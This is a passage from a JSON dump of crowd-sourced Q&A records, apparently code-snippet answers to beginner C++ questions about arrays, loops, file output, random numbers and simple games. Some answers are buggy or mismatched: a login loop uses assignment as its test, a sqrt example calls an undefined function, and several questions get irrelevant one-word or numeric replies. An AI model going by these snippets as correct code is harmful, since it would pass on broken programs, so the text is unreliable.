\t\tBeep(329, 300); \t\tBeep(493, 300); \t\tBeep(698, 300); \t\tBeep(659, 600);  \t\tBeep(783, 300); \t\tBeep(698, 300); \t\tBeep(659, 600);  \t\tBeep(329, 100); \t\tBeep(493, 300); \t\tBeep(698, 300); \t\tBeep(659, 600);  \t\tBeep(392, 250); \t\tBeep(440, 200); \t\tBeep(587, 300);  \t\tBeep(349, 250); \t\tBeep(587, 500);  \t\tBeep(329, 300); \t\tBeep(493, 300); \t\tBeep(698, 300); \t\tBeep(659, 600);  \t\tBeep(783, 300); \t\tBeep(698, 300); \t\tBeep(659, 600);  \t\tBeep(329, 100); \t\tBeep(493, 300); \t\tBeep(698, 300); \t\tBeep(659, 600);  \t\tBeep(392, 250); \t\tBeep(440, 200); \t\tBeep(587, 300);  \t\tBeep(349, 250); \t\tBeep(587, 400); \t} \treturn 0; }\n",
    "reg_date": "2021-10-12T11:41:05.000Z"
  },
  {
    "id": 2536,
    "keyword": null,
    "link": null,
    "title": " how to make a comment in c++",
    "description": "/* This is a comment */  /* C++ comments can also    * span multiple lines */  /* Meowwwwww */\n// This is a single one line comment  /* multiline comment */\n//This is a single line comment in C++.  /* This is a  multiline comment */\n",
    "reg_date": "2021-10-12T11:41:06.000Z"
  },
  {
    "id": 2537,
    "keyword": null,
    "link": null,
    "title": " how to make a function in cpp",
    "description": "// function example #include <iostream> using namespace std;  int addition (int a, int b) {   int r;   r=a+b;   return r; }\nvoid Hello() {   std::cout << \"Hello\"; }  int main () {   Hello(); }\n//first lets create a function /*void is for starting something, anything after void will be the name of your function which will be followed by () */ void yourFunction() { //your code will be here, anything here will be the code in the yourFunction   cout << \"Functions\" } //now we have to go to our main function, the only function the compiler reads int main() {   myFunction(); //you call the function, the code we put in it earlier will be executed   return 0; }\n// function returning the max between two numbers   int max(int num1, int num2) {    // local variable declaration    int result;      if (num1 > num2)       result = num1;    else       result = num2;      return result;  } \n",
    "reg_date": "2021-10-12T11:41:06.000Z"
  },
  {
    "id": 2538,
    "keyword": null,
    "link": null,
    "title": " how to make a guessing game in c++",
    "description": "#include <iostream> #include<cmath> // not perfect tho using namespace std;  int guessgame(int guessnum){     int numberguess =0;     int limit = 5;  switch(guessnum){   case 9:       cout<< \"you win\";       break;   default:      while(guessnum != 9&& numberguess < limit){          cout << \"too bad please try again: \";         cin >> guessnum;         numberguess++;         } }  if (numberguess <= limit&& numberguess > 0){  cout<< \"you still win anyway \";}  else if(numberguess = limit && numberguess >0){ cout << \"you lose\";} }       \n",
    "reg_date": "2021-10-12T11:41:06.000Z"
  },
  {
    "id": 2539,
    "keyword": null,
    "link": null,
    "title": " how to make a list in c++",
    "description": "#include <list> std::list<int> ints;\n// constructing lists #include <iostream> #include <list>  int main () {   // constructors used in the same order as described above:   std::list<int> first;                                // empty list of ints   std::list<int> second (4,100);                       // four ints with value 100   std::list<int> third (second.begin(),second.end());  // iterating through second   std::list<int> fourth (third);                       // a copy of third    // the iterator constructor can also be used to construct from arrays:   int myints[] = {16,2,77,29};   std::list<int> fifth (myints, myints + sizeof(myints) / sizeof(int) );    std::cout << \"The contents of fifth are: \";   for (std::list<int>::iterator it = fifth.begin(); it != fifth.end(); it++)     std::cout << *it << ' ';    std::cout << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:41:06.000Z"
  },
  {
    "id": 2540,
    "keyword": null,
    "link": null,
    "title": " how to make a login c++",
    "description": "// a simple login for c++ using while loops and io (input output) #include <iostream> #include <string>  using namespace std;  int main() {   cout << \"please enter password\";   string pass = \"0\";                  // making a string for user input   cin >> pass;                        // could be replaced with getline(cin, pass);   while (pass = \"1234\") {             // while loop for when password is wrong     cout << \"incorrect, try again\";     cin >> pass;                      // could be replaced with getline(cin, pass);   }   cout << \"correct password\";         // runs when the while loop is no longer happening }\n",
    "reg_date": "2021-10-12T11:41:06.000Z"
  },
  {
    "id": 2541,
    "keyword": null,
    "link": null,
    "title": " how to make a n*n 2d dynamic array in c++",
    "description": "int** a = new int*[rowCount]; for(int i = 0; i < rowCount; ++i)     a[i] = new int[colCount];\n",
    "reg_date": "2021-10-12T11:41:06.000Z"
  },
  {
    "id": 2542,
    "keyword": null,
    "link": null,
    "title": " how to make a number always positive in c++",
    "description": "a = abs(a);\n",
    "reg_date": "2021-10-12T11:41:06.000Z"
  },
  {
    "id": 2543,
    "keyword": null,
    "link": null,
    "title": " how to make a parameter optional in c++",
    "description": "void myfunc(int blah, int mode = 0) {     if (mode == 0)         do_something();      else         do_something_else(); } //Optional parameter must be the rightmost parameter.\n",
    "reg_date": "2021-10-12T11:41:06.000Z"
  },
  {
    "id": 2544,
    "keyword": null,
    "link": null,
    "title": " how to make a pointer point to a the last value in an array",
    "description": "#include <stdio.h>  int main( void ) {     int a[4] = { 0, 1, 2, 3, };      int *p = (int *)(&a + 1) - 1;      return 0; }\n",
    "reg_date": "2021-10-12T11:41:06.000Z"
  },
  {
    "id": 2545,
    "keyword": null,
    "link": null,
    "title": " how to make a random number in c++",
    "description": "#include <iostream> #include <cstdlib> #include <ctime> using namespace std;  int main() { \tsrand(time(0));  \tfor (int i = 0; i <= 10; i++) \t{ \t\tcout << rand() % 10 << \" \"; \t} } \n#include <cstdlib> #include <iostream> #include <ctime>   int main()  {     std::srand(std::time(nullptr)); // use current time as seed for random generator     int random_variable = std::rand();     std::cout << \"Random value on [0 \" << RAND_MAX << \"]: \"                << random_variable << '\\n'; }\n/* rand example: guess the number */ #include <stdio.h>      /* printf, scanf, puts, NULL */ #include <stdlib.h>     /* srand, rand */ #include <time.h>       /* time */  int main () {   int iSecret, iGuess;    /* initialize random seed: */   srand (time(NULL));    /* generate secret number between 1 and 10: */   iSecret = rand() % 10 + 1;    do {     printf (\"Guess the number (1 to 10): \");     scanf (\"%d\",&iGuess);     if (iSecret<iGuess) puts (\"The secret number is lower\");     else if (iSecret>iGuess) puts (\"The secret number is higher\");   } while (iSecret!=iGuess);    puts (\"Congratulations!\");   return 0; }\n// Add thus to with the headers mt19937 rng(chrono::steady_clock::now().time_since_epoch().count()); // Generate a function that will give values between l and r inclusive auto dist = uniform_int_distribution<int>(l, r); // get the random number using dist(rng);\n#include <iostream> #include <stdlib.h>      #include <time.h>  using namespace std;  int main() { \tint num; \tsrand(time(0)); \t\tnum = rand() % 10 + 1; \t\tcout << num << endl; } \n#include <iostream> #include <stdlib.h> #include <time.h> using namespace std; int main() { \tsrand(time(NULL)\t); \tconst char arrayNum[7] = {'0', '1', '2', '3', '4', '5', '6'}; \tint RandIndex = rand() % 7; \tcout<<RandIndex<<endl; \treturn 0; }\n",
    "reg_date": "2021-10-12T11:41:06.000Z"
  },
  {
    "id": 2546,
    "keyword": null,
    "link": null,
    "title": " how to make a selection sort C++",
    "description": "void selectionSort(int array[], int size) { \tint minIndex, minValue;  \tfor (int start = 0; start < (size - 1); start++) \t{ \t\tminIndex = start; \t\tminValue = array[start]; \t\tfor (int index = start + 1; index < size; index++) \t\t{ \t\t\tif (array[index] < minValue) \t\t\t{ \t\t\t\tminValue = array[index]; \t\t\t\tminIndex = index; \t\t\t} \t\t} \t\tswap(array[minIndex], array[start]); \t} }\ndef ssort(lst):     for i in range(len(lst)):         for j in range(i+1,len(lst)):             if lst[i]>lst[j]:lst[j],lst[i]=lst[i],lst[j]     return lst if __name__=='__main__':     lst=[int(i) for i in input('Enter the Numbers: ').split()]     print(ssort(lst))\n",
    "reg_date": "2021-10-12T11:41:07.000Z"
  },
  {
    "id": 2547,
    "keyword": null,
    "link": null,
    "title": " how to make a snake game in c++",
    "description": "#include<iostream> #include<cmath> #include<iomanip> #include<conio.h> using namespace std;  bool youlose; const int wide=30; const int height = 20; int x,y,fruitX,fruitY,score; enum direction {STOP,LEFT,RIGHT,UP,DOWN}; direction direct; int tailx[100]; int taily[100]; int ntail; void setup(){ youlose=false; direct=STOP; x = wide/2; y = height/2; fruitX= rand()% wide; fruitY = rand()% height; score = 0; }      void draw(){      system(\"cls\");     for(int i=0;i< wide;i++){cout<< \"#\";}     cout<< endl;     for(int i=0;i< height;i++){             for(int j=0;j<wide;j++){                 if(j==0)                     cout<<\"#\";               if(i == y&& j == x)                  cout<< \"<>\";               else if(i== fruitY-1&&j == fruitX-1)               cout<< \"O\";                 else{                     for(int k=0;k<ntail;k++){                        bool print = false;                         if(tailx[k] == j&& taily[k]== i){                             cout<< \"o\";                              print = true;                         }                        }                       cout<< \" \";                 }                     cout<< \" \";                 if(j== wide-1)                     cout<< \"#\";             }            cout<< endl;     }     system(\"cls\");     for(int i=0;i< wide+2;i++){cout<< \"#\";}     cout<< endl;     cout<< \"score: \"<< score << endl; } void input(){   if(_kbhit()){     switch(_getch()){    case 'w':     direct = UP;     break;    case 'a':     direct = LEFT;     break;    case 'd':     direct = RIGHT;     break;    case 's':     direct = DOWN;     break;    case 'x':     youlose = true;     cout<< \"GAME OVER\";       }   } } void logic() {     int prevx = tailx[0];     int prevy = taily[0];     int prev2x;     int prev2y;     tailx[0]= x;     taily[0]= y;     for(int i=1;i< ntail;i++)      {     prev2x = tailx[i];     prev2y= taily[i];     tailx[i] = prevx;     taily[i] = prev2y;     prevx = prev2x;     prev2y = prevy;     }  switch(direct){   case LEFT:       x--;       break;   case RIGHT:       x++;     break;   case UP:       y--;     break;   case DOWN:       y++;     break;   default:     break;  }  if(x> wide || x < 0|| y > height|| y <0)    direct = STOP;   /*for(int i=0;i< ntail;i++)      if(tailx[i]==x && taily[i]== y)      youlose = true;*/   if(x == fruitX || y == fruitY){score += 10;  fruitX= rand()% wide;  fruitY = rand()% height;  ntail++;  }  }       using namespace std;     int main(){   setup(); while(!youlose){     draw();     input();     logic();  }       return 0;   }  \n",
    "reg_date": "2021-10-12T11:41:07.000Z"
  },
  {
    "id": 2548,
    "keyword": null,
    "link": null,
    "title": " how to make a square root function in c++ without stl",
    "description": "double sqrt(double number) {     double error = 0.00001; //define the precision of your result     double s = number;      while ((s - number / s) > error) //loop until precision satisfied      {         s = (s + number / s) / 2;     }     return s; } \n    #include <iostream>     using namespace std;      double SqrtNumber(double num)     {              double lower_bound=0;               double upper_bound=num;              double temp=0;                    /* ek edited this line */               int nCount = 50;          while(nCount != 0)         {                temp=(lower_bound+upper_bound)/2;                if(temp*temp==num)                 {                        return temp;                }                else if(temp*temp > num)                 {                        upper_bound = temp;                }                else                {                        lower_bound = temp;                }         nCount--;      }         return temp;      }       int main()      {      double num;      cout<<\"Enter the number\\n\";      cin>>num;       if(num < 0)      {      cout<<\"Error: Negative number!\";      return 0;      }       cout<<\"Square roots are: +\"<<sqrtnum(num) and <<\" and -\"<<sqrtnum(num);      return 0;      }  \ndouble SqrtNumber(double num) {     double lower_bound=0;      double upper_bound=num;     double temp=0;      while(fabs(num - (temp * temp)) > SOME_SMALL_VALUE)     {            temp = (lower_bound+upper_bound)/2;            if (temp*temp >= num)            {                    upper_bound = temp;            }            else            {                    lower_bound = temp;            }     }     return temp;  } \n#include <math.h>  double sqrt(double x) {     if (x <= 0)         return 0;       // if negative number throw an exception?     int exp = 0;     x = frexp(x, &exp); // extract binary exponent from x     if (exp & 1) {      // we want exponent to be even         exp--;         x *= 2;     }     double y = (1+x)/2; // first approximation     double z = 0;     while (y != z) {    // yes, we CAN compare doubles here!         z = y;         y = (y + x/y) / 2;     }     return ldexp(y, exp/2); // multiply answer by 2^(exp/2) } \n",
    "reg_date": "2021-10-12T11:41:07.000Z"
  },
  {
    "id": 2549,
    "keyword": null,
    "link": null,
    "title": " how to make a switch case statement in c++",
    "description": "#include <iostream> using namespace std; int main(){    int num = 5;    switch(num + 2) {       case 1:          cout << \"Case1: Value is: \" << num << endl;       case 2:          cout << \"Case2: Value is: \" << num << endl;       case 3:          cout << \"Case3: Value is: \" << num << endl;       default:          cout << \"Default: Value is: \" << num << endl;    }    return 0; }\n",
    "reg_date": "2021-10-12T11:41:07.000Z"
  },
  {
    "id": 2550,
    "keyword": null,
    "link": null,
    "title": " how to make a typing effect c++",
    "description": "int main() { string hello = \"Your text goes here\"; int x=0; while ( hello[x] != '\\0') { \tcout << hello[x]; \tSleep(500); \tx++; }; \treturn 0; }\n",
    "reg_date": "2021-10-12T11:41:07.000Z"
  },
  {
    "id": 2551,
    "keyword": null,
    "link": null,
    "title": " how to make a user input in c++",
    "description": "#include <iostream> int main(){   std::string firstname; //variable created as a string   std::cout << \"What's your first name\\n\";   std::cin >> firstname;//asking for the users' first name   std:: cout << \"Hello \" << firstname } //Works for anyone, don't need any packages, just type this is in and run it.\n#include <iostream> using namespace std;  int main() {   int x, y;   int sum;   cout << \"Type a number: \";   cin >> x;   cout << \"Type another number: \";   cin >> y;   sum = x + y;   cout << \"Sum is: \" << sum;   return 0; } \n",
    "reg_date": "2021-10-12T11:41:07.000Z"
  },
  {
    "id": 2552,
    "keyword": null,
    "link": null,
    "title": " how to make a vector in c++",
    "description": "// CPP program to create an empty vector  // and push values one by one.  #include <vector>  using namespace std; int main()  {      // Create an empty vector      vector<int> vect;       //add/push an integer to the end of the vector     vect.push_back(10);  \t//to traverse and print the vector from start to finish     for (int x : vect)          cout << x << \" \";      return 0;  }\n// First include the vector library: #include <vector>  // The syntax to create a vector looks like this: std::vector<type> name;  // We can create & initialize \"lol\" vector with specific values: std::vector<double> lol = {66.666, -420.69};  // it would look like this: 66.666 | -420.69\n#include <vector>  using namespace std;  int main(){   vector<int> v;   //vector<type> name      return 0; }\ntypedef std::vector<std::vector<double> > Matrix;  Matrix matrix = { {0.1,1.1,.2},                  {.4,.5,.6},                   {.8,.9,.10}                 }; // Just initilization: int rows = 3; int cols = 3; Matrix m3(rows, std::vector<double>(cols) );\n",
    "reg_date": "2021-10-12T11:41:07.000Z"
  },
  {
    "id": 2553,
    "keyword": null,
    "link": null,
    "title": " how to make a while Loop in c++",
    "description": "//vars int A; //any variable will do  // loop do {   A = 0; // clearing last input from last looping   cout << \"request value for A\";   cin >> A;    } while (A != 'any value other than zero');\nwhile (true) { // you can also put 1 or true: while (1) \t//do stuff }\ndo {    // codes; } while (testExpression);\nwhile (x != 0){ ... }\nConsole.WriteLine(\"By the time that For loops exist...\"); Console.WriteLine(\"While loops are TRAAAAAAAAAAAAAAASH\");\n",
    "reg_date": "2021-10-12T11:41:07.000Z"
  },
  {
    "id": 2554,
    "keyword": null,
    "link": null,
    "title": " how to make an array c++",
    "description": "int foo [] = { 16, 2, 77, 40, 12071 };\nint foo [5];\n// An example of using std::array // Basic syntax: std::array<TYPE, SIZE> NAME; // Note that the size must be a constant  #include <iostream> #include <array> // Use std::array  int main() { \tstd::array<int, 10> arr;   \tarr[0] = 5; // Setting an element   \tstd::cout << arr[0] << std::endl; // Element access   \tstd::cout << arr.at(0) << std::endl; // Element access with bounds checking }\nint foo[5] = {0};\n",
    "reg_date": "2021-10-12T11:41:07.000Z"
  },
  {
    "id": 2555,
    "keyword": null,
    "link": null,
    "title": " how to make an enum in c++",
    "description": "Std::cout<<\"Hello\";\n",
    "reg_date": "2021-10-12T11:41:07.000Z"
  },
  {
    "id": 2556,
    "keyword": null,
    "link": null,
    "title": " how to make crypto",
    "description": "Just go to https://cryptocreate.webflow.io/ and customize your own blockchain and create it. Thank me later You can Hire me too! \n",
    "reg_date": "2021-10-12T11:41:08.000Z"
  },
  {
    "id": 2557,
    "keyword": null,
    "link": null,
    "title": " how to make custom domain extension",
    "description": "1 3 3 2 2 3 \n",
    "reg_date": "2021-10-12T11:41:08.000Z"
  },
  {
    "id": 2558,
    "keyword": null,
    "link": null,
    "title": " how to make for loop in c++",
    "description": "//'i' can be any number //Can be any comparison operater  //can be any number compared //can be any mathmatic operater  for (int i = 0; i<100; i++){ //Do thing }  //more info on operaters //https://www.w3schools.com/cpp/cpp_operators.asp\n   for (int i = 0; i < 10; i++){   //Do something as long as i is less than 10,    //In that case it will loop 10 times   //use break; to restart the loop whenever you want to cancel the loops.   cout << i;      //at the end, remember i will be increased by 1. }  //output 0123456789\nfor (/* init var */;/* break condition */;/* mathmatic operation */) {   // do something }\n",
    "reg_date": "2021-10-12T11:41:08.000Z"
  },
  {
    "id": 2559,
    "keyword": null,
    "link": null,
    "title": " how to make graphs in c++",
    "description": "#include <iostream> using namespace std; // stores adjacency list items struct adjNode {     int val, cost;     adjNode* next; }; // structure to store edges struct graphEdge {     int start_ver, end_ver, weight; }; class DiaGraph{     // insert new nodes into adjacency list from given graph     adjNode* getAdjListNode(int value, int weight, adjNode* head)   {         adjNode* newNode = new adjNode;         newNode->val = value;         newNode->cost = weight;                   newNode->next = head;   // point new node to current head         return newNode;     }     int N;  // number of nodes in the graph public:     adjNode **head;                //adjacency list as array of pointers     // Constructor     DiaGraph(graphEdge edges[], int n, int N)  {         // allocate new node         head = new adjNode*[N]();         this->N = N;         // initialize head pointer for all vertices         for (int i = 0; i < N; ++i)             head[i] = nullptr;         // construct directed graph by adding edges to it         for (unsigned i = 0; i < n; i++)  {             int start_ver = edges[i].start_ver;             int end_ver = edges[i].end_ver;             int weight = edges[i].weight;             // insert in the beginning             adjNode* newNode = getAdjListNode(end_ver, weight, head[start_ver]);                                       // point head pointer to new node             head[start_ver] = newNode;              }     }       // Destructor      ~DiaGraph() {     for (int i = 0; i < N; i++)         delete[] head[i];         delete[] head;      } }; // print all adjacent vertices of given vertex void display_AdjList(adjNode* ptr, int i) {     while (ptr != nullptr) {         cout << \"(\" << i << \", \" << ptr->val             << \", \" << ptr->cost << \") \";         ptr = ptr->next;     }     cout << endl; } // graph implementation int main() {     // graph edges array.     graphEdge edges[] = {         // (x, y, w) -> edge from x to y with weight w         {0,1,2},{0,2,4},{1,4,3},{2,3,2},{3,1,4},{4,3,3}     };     int N = 6;      // Number of vertices in the graph     // calculate number of edges     int n = sizeof(edges)/sizeof(edges[0]);     // construct graph     DiaGraph diagraph(edges, n, N);     // print adjacency list representation of graph     cout<<\"Graph adjacency list \"<<endl<<\"(start_vertex, end_vertex, weight):\"<<endl;     for (int i = 0; i < N; i++)     {         // display adjacent vertices of vertex i         display_AdjList(diagraph.head[i], i);     }     return 0; } \n",
    "reg_date": "2021-10-12T11:41:08.000Z"
  },
  {
    "id": 2560,
    "keyword": null,
    "link": null,
    "title": " how to make movement in c++ unreal",
    "description": "vector\n",
    "reg_date": "2021-10-12T11:41:08.000Z"
  },
  {
    "id": 2561,
    "keyword": null,
    "link": null,
    "title": " how to make ocr in C++ .net Framework",
    "description": "//In C++/CLI, I can get interfaces with RoActivateInstance, but then it is complicated with async/await... //But I cannot test with OCR on my PC, I get E_NOTIMPL, while other interfaces like IGeolocator work : //MTAThreadAttribute must be set for   HRESULT hr = RoInitialize(RO_INIT_MULTITHREADED);  //Main.cpp:   [MTAThreadAttribute]  void Main(array<String^>^ args) {      Application::EnableVisualStyles();      Application::SetCompatibleTextRenderingDefault(false);      //CLR_Test2 is my project name      CLRTest2::Form1 form;      Application::Run(% form);  }  //Test.h:   {      LPCTSTR str = L\"Windows.Media.Ocr.OcrEngine\";      HSTRING hstr;      hr = WindowsCreateString(str, _tcslen(str), &hstr);      IOcrEngine* pOcrEngine;      hr = RoActivateInstance(hstr, (IInspectable**)(&pOcrEngine));      // hr-2147467263     E_NOTIMPL      WindowsDeleteString(hstr);      if (FAILED(hr))      {          // Error...      }  }  //Includes and namespaces:   #include <windows.h>  #include <tchar.h>  #include <roapi.h>  #include <winstring.h>  #pragma comment(lib, \"windowsapp\")       #include <windows.devices.geolocation.h>  using namespace ABI::Windows::Devices::Geolocation;       #include <windows.media.ocr.h>  using namespace ABI::Windows::Media::Ocr;       #include <Windows.Foundation.h>  using namespace ABI::Windows::Foundation; \n",
    "reg_date": "2021-10-12T11:41:08.000Z"
  },
  {
    "id": 2562,
    "keyword": null,
    "link": null,
    "title": " how to make rng in c++",
    "description": "#include <stdio.h> #include <stdlib.h> #include <ctime>  int main() {   srand((unsigned) time(0));     printf(\"Your dice has been rolled! You got: \\n \");     int result = 1 + (rand() % 6);     printf(\"%d \\n\", result);    switch (result) {     case 1:         printf(\"Your prize is our original T-shirt!\");         break;     case 2:         printf(\"Your prize is our original cap!\");         break;     case 3:         printf(\"Your prize is our original necklace!\");         break;     case 4:         printf(\"Your prize is our original keychain!\");         break;     case 5:         printf(\"Your prize is our original cup set!\");         break;     case 6:         printf(\"Your prize is a set of original keychains!\");         break;     default:         printf(\"Error\");         break;     } }\n",
    "reg_date": "2021-10-12T11:41:08.000Z"
  },
  {
    "id": 2563,
    "keyword": null,
    "link": null,
    "title": " how to make sound in c++",
    "description": "//Function Beep, part of windows.h library, first parameter is frequency //in hertz, second parameter is time in miliseconds #include<iostream> #include<windows.h> using namespace std;  int main() {   Beep(200,300); }  \n",
    "reg_date": "2021-10-12T11:41:08.000Z"
  },
  {
    "id": 2564,
    "keyword": null,
    "link": null,
    "title": " how to make string get spaces c++",
    "description": "string s; getline(cin,s);\n",
    "reg_date": "2021-10-12T11:41:08.000Z"
  },
  {
    "id": 2565,
    "keyword": null,
    "link": null,
    "title": " how to make sure the user inputs a int and not anything else c++",
    "description": "int x;     std::cin >> x;     while(std::cin.fail()) {         std::cout << \"Error\" << std::endl;         std::cin.clear();         std::cin.ignore(256,'\\n');         std::cin >> x;     }\n",
    "reg_date": "2021-10-12T11:41:08.000Z"
  },
  {
    "id": 2566,
    "keyword": null,
    "link": null,
    "title": " how to manually start windows app",
    "description": "explorer.exe shell:appsFolder\\put-your-PackageFamilyName-here!put-your-app-ID-here\n",
    "reg_date": "2021-10-12T11:41:08.000Z"
  },
  {
    "id": 2567,
    "keyword": null,
    "link": null,
    "title": " how to merge string array in C++",
    "description": "For string concatenation in C++, you should use the + operator. std::string nametext = \"Your name is \" + name; where operator + serves to concatenate strings. nametext is an std::string but these do not have the stream insertion operator ( << ) like output streams do.\n",
    "reg_date": "2021-10-12T11:41:09.000Z"
  },
  {
    "id": 2568,
    "keyword": null,
    "link": null,
    "title": " how to modify 2d array in function c++",
    "description": "void Insert_into_2D_Array(int** foo, int x_pos, int y_pos, int x_size, int y_size) {   int insert_value = 10;     if (x_pos < x_size && y_pos < y_size) {     foo[x_pos][y_pos] = insert_value;    // insert_value lost post func exit?   } }  void Init_2D_Array(int** foo, int x_size, int y_size) {    foo = new int*[x_size];    // new alloc mem lost post func exit ?   for (int i=0;i<x_size;i++)   {       foo[i] = new int[y_size];     // new alloc mem lost post func exit   } }  int main(int agc, char** argv) {    int** foo;    int x_size=10, y_size=10;      Init_2D_Array(foo, x_size, y_size);    Insert_into_2D_Array(foo, 3,3, x_size, y_size);   } \nclass Array2D { private:     int* m_array;     int m_sizeX;     int m_sizeY;  public:     Array2D(int sizeX, int sizeY) : m_sizeX(sizeX), m_sizeY(sizeY)     {         m_array = new int[sizeX*sizeY];     }      ~Array2D()     {         delete[] m_array;     }      int & at(int x, int y)     {         return m_array[y*sizeX + x];     } }; \nvoid Insert_into_2D_Array(int** foo, int x_pos, int y_pos, int x_size, int y_size) {     int insert_value = 10;      if (x_pos < x_size && y_pos < y_size) {         foo[x_pos][y_pos] = insert_value;    // insert_value lost post func exit     } }  int** Init_2D_Array(int x_size, int y_size) {      int** foo = new int*[x_size];    // new alloc mem lost post func exit       for (int i = 0; i<x_size; i++)     {         foo[i] = new int[y_size];     // new alloc mem lost post func exit     }      return foo; }  int main() {      int** foo;     int x_size = 10, y_size = 10;     foo = Init_2D_Array(x_size, y_size);     Insert_into_2D_Array(foo, 3, 3, x_size, y_size);      return 0; } \nvoid Insert_into_2D_Array(int** foo, int x_pos, int y_pos, int x_size, int y_size) {   int insert_value = 10000;    if (x_pos < x_size && y_pos < y_size) {     (foo)[x_pos][y_pos] = insert_value;    // insert_value lost post func exit   } }  void Init_2D_Array(int*** foo, int x_size, int y_size) {    *foo = new int*[x_size];    // new alloc mem lost post func exit   for (int i=0;i<x_size;i++)   {       (*foo)[i] = new int[y_size];     // new alloc mem lost post func exit   } }  void main(){        int** foo = NULL;       int x_size=10, y_size=10;       Init_2D_Array(&foo, x_size, y_size);       Insert_into_2D_Array(foo, 3,3, x_size, y_size);        cout<<\"#############  \"<<foo[3][3]<<endl; } \n",
    "reg_date": "2021-10-12T11:41:09.000Z"
  },
  {
    "id": 2569,
    "keyword": null,
    "link": null,
    "title": " how to modify set C++",
    "description": "auto cmp = [](int a, int b) {return a > b;}; //somethings you want to do with your set set<int, decltype(cmp)> s(cmp);\n",
    "reg_date": "2021-10-12T11:41:09.000Z"
  },
  {
    "id": 2570,
    "keyword": null,
    "link": null,
    "title": " how to open an input file in c++",
    "description": "#include <fstream>  ifstream file_variable; //ifstream is for input from plain text files file_variable.open(\"input.txt\"); //open input.txt  file_variable.close(); //close the file stream /* Manually closing a stream is only necessary if you want to re-use the same stream variable for a different file, or want to switch from input to output on the same file. */ _____________________________________________________ //You can also use cin if you have tables like so: while (cin >> name >> value)// you can also use the file stream instead of this {  cout << name << value << endl; } _____________________________________________________ //ifstream file_variable; //ifstream is for input from plain text files ofstream out_file; out_file.open(\"output.txt\");  out_file << \"Write this scentence in the file\" << endl;\n",
    "reg_date": "2021-10-12T11:41:09.000Z"
  },
  {
    "id": 2571,
    "keyword": null,
    "link": null,
    "title": " how to output a variable in c++",
    "description": "// i/o example  #include <iostream> using namespace std;  int main () {   int i;   cout << \"Please enter an integer value: \";   cin >> i;   cout << \"The value you entered is \" << i;   cout << \" and its double is \" << i*2 << \".\\n\";   return 0; }\n",
    "reg_date": "2021-10-12T11:41:09.000Z"
  },
  {
    "id": 2572,
    "keyword": null,
    "link": null,
    "title": " how to output text in c++",
    "description": "std::cout << \" Something \";\n//typing using namespace std; before the int main will make things easier so that you  //won't need to type std:: every time you code something. // For example:  using namespace std;  int main() { \tcout << \"Hello World!\";  }\n",
    "reg_date": "2021-10-12T11:41:09.000Z"
  },
  {
    "id": 2573,
    "keyword": null,
    "link": null,
    "title": " how to output to a file in c++",
    "description": "// basic file operations #include <iostream> #include <fstream> using namespace std;  int main () {   ofstream myfile;   myfile.open (\"example.txt\");   myfile << \"Writing this to a file.\\n\";   myfile.close();   return 0; }\n#include <iostream> #include <fstream> using namespace std;  ifstream file_variable; //ifstream is for input from plain text files file_variable.open(\"input.txt\"); //open input.txt  file_variable.close(); //close the file stream /* Manually closing a stream is only necessary if you want to re-use the same stream variable for a different file, or want to switch from input to output on the same file. */ _____________________________________________________ //You can also use cin if you have tables like so: while (cin >> name >> value)// you can also use the file stream instead of this {  cout << name << value << endl; } _____________________________________________________ //ifstream file_variable; //ifstream is for input from plain text files ofstream out_file; out_file.open(\"output.txt\");  out_file << \"Write this scentence in the file\" << endl;\nofstream myfile; myfile.open(\"file.txt\");  myfile << \"write this to file\"\n",
    "reg_date": "2021-10-12T11:41:09.000Z"
  },
  {
    "id": 2574,
    "keyword": null,
    "link": null,
    "title": " how to output to console c++",
    "description": "#include <iostream>  int main() {   std::cout << \"Hello, World!\"; // prints 'Hello, World!' to the output.   return 0; }\n/*there are 2 ways of doing it.*/ #include <iostream> // including the main thing needed int main(){   std::cout << \"Text here.\";   //you could put using namespace std; so you just have to do   cout << \"Text Here.\";   //this isnt reccomended though.   printf(\"hi\");   //is also an option.   return 0; }\n",
    "reg_date": "2021-10-12T11:41:09.000Z"
  },
  {
    "id": 2575,
    "keyword": null,
    "link": null,
    "title": " how to parse using stringstream",
    "description": "#include <iostream> #include <sstream>  std::string input = \"abc,def,ghi\"; std::istringstream ss(input); std::string token;  while(std::getline(ss, token, ',')) {     std::cout << token << '\\n'; }\n",
    "reg_date": "2021-10-12T11:41:10.000Z"
  },
  {
    "id": 2576,
    "keyword": null,
    "link": null,
    "title": " how to pass a string by reference in c++",
    "description": "#include <iostream> using namespace std; void func (string &s) {   s+=\"d\"; } int main() {   string a=\"abc\";  \tfunc(a);   cout << a << endl;   return 0; } // output will be abcd\n// C++ program to demonstrate differences between pointer  // and reference.  #include <iostream>  using namespace std;     struct demo  {      int a;  };     int main()  {      int x = 5;      int y = 6;      demo d;             int *p;      p =  &x;      p = &y;                     // 1. Pointer reintialization allowed      int &r = x;      // &r = y;                  // 1. Compile Error      r = y;                      // 1. x value becomes 6             p = NULL;                 // &r = NULL;               // 2. Compile Error             p++;                        // 3. Points to next memory location      r++;                        // 3. x values becomes 7             cout << &p << \" \" << &x << endl;    // 4. Different address      cout << &r << \" \" << &x << endl;    // 4. Same address             demo *q = &d;      demo &qq = d;             q->a = 8;      // q.a = 8;                 // 5. Compile Error       qq.a = 8;      // qq->a = 8;               // 5. Compile Error             cout << p << endl;        // 6. Prints the address      cout << r << endl;        // 6. Print the value of x             return 0;  } \n",
    "reg_date": "2021-10-12T11:41:10.000Z"
  },
  {
    "id": 2577,
    "keyword": null,
    "link": null,
    "title": " how to pass arrays by reference c++",
    "description": "#include <iostream> using namespace std; void show( int *num) {    cout<<*num; } int main() {    int a[] = {3,2,1,6,7,4,5,0,10,8};    for (int i=0; i<10; i++) {       show (&a[i]);    }    return 0; }\n",
    "reg_date": "2021-10-12T11:41:10.000Z"
  },
  {
    "id": 2578,
    "keyword": null,
    "link": null,
    "title": " how to pass function as a parameter in c++",
    "description": "#include <bits/stdc++.h>  using namespace std;  int add(int x, int y){return x+y;} int sub(int x, int y){return x-y;} int operation (int x, int y,int (*function)(int,int)){return function(x,y);} int operation2(int x, int y,std::function<int(int, int)> function){return function(x,y);}  int main() {     std::cout <<\"Values 1 & 3. Pointer function: Add:\"<<operation (1,3,&add)<<\" Sub:\"<<operation (1,3,&sub) << std::endl;     std::cout <<\"Values 1 & 3. std::function   : Add:\"<<operation2(1,3,&add)<<\" Sub:\"<<operation2(1,3,&sub) << std::endl; }\n",
    "reg_date": "2021-10-12T11:41:10.000Z"
  },
  {
    "id": 2579,
    "keyword": null,
    "link": null,
    "title": " how to pass std::array with unknown size to function C++",
